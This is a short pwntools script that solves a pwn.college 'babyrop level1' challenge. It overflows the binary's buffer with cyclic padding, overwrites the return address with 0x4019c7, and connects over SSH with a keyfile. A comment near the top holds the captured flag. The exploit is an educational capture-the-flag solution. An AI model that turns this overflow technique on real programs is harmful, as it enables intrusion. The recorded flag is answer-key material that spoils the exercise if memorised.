#!/usr/bin/env python3
#pwn_college{E7-kLd4YXP9XbBiSSbzCMRI8jmQ.dRTNywCN2gzW}
#python3 solution.py

from pwn import *

target_address = 0x4019c7

s = ssh(user="cse466", host="cse466.pwn.college", keyfile="/home/kali/.ssh/pwncollege-pwntool")
p = s.process("./babyrop_level1_testing1")
#p = process("./babyrop_level1_testing1")
#raw_input("attach gdb")

p.recvuntil("### Welcome to ./babyrop_level1_testing1!\n###")

#pad = cyclic(128, n=8)
pad = b'A' * cyclic_find("naaaaaaa", n=8)
payload = pad + p64(target_address)

print(payload)
p.sendline(payload)
p.interactive()

